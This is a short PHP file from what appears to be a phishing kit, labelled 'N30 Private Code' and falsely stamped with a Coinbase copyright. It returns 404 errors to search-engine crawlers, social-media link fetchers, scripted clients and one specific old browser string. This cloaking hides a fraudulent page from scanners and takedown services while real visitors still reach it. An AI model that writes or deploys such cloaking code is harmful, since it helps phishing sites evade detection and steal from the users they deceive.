<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 Coinbase          $#
###############################################
**/
	if(strpos($_SERVER['HTTP_USER_AGENT'], 'google')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Java')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL')
		or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
			header("HTTP/1.0 404 Not Found");exit();

	}

	if ($_SERVER['HTTP_USER_AGENT'] == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
			header("HTTP/1.0 404 Not Found");exit();

    }

?>